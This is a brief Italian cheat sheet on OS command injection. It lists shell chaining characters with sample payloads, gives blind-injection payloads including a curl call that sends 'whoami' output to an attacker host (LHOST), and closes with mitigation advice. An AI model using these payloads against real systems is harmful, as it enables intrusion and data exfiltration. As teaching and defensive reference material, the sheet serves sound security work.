L'app passa input dell'utente a una shell di sistema. Tu
concateni comandi tuoi.

## Sfruttamento

Caratteri che concatenano comandi shell:
```
	; ls                          -> esegue dopo il primo comando
	| ls                          -> manda output del primo comando in input al secondo
	|| ls                         -> esegue il secondo se il primo fallisce              
	&& whoami                     -> esegue il secondo se il primo ha successo
	` id`                         |
	$(id)                         -> command substitution
	%0a id                           (newline URL-encoded)
```

## Blind command injection

```
	; sleep 5
	; ping -c 4 LHOST
	; curl http://LHOST/$(whoami)
```

### Mitigazione

Evita di chiamare la shell; usa API native del linguaggio. Allowlist rigida + escaping degli argomenti (escapeshellarg), mai passare input grezzo alla shell.